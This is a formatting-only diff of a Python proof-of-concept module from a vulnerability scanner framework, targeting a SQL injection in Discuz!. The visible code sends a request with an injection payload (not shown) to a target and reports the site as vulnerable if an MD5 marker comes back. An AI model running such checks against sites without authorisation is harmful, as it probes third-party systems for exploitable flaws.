@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Discuz_0003'  # 平台漏洞编号，留空
     name = 'Discuz! SQL注入'  # 漏洞名称
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Discuz!'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '5ae2c103-fd61-4ed8-8650-5d0963ac7fa0'
@@ -36,14 +38,15 @@ class Poc(ABPoc):
             verify_url = self.target + payload
             req = requests.get(verify_url)
             if '202cb962ac59075b964b07152d234b70' in req.content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
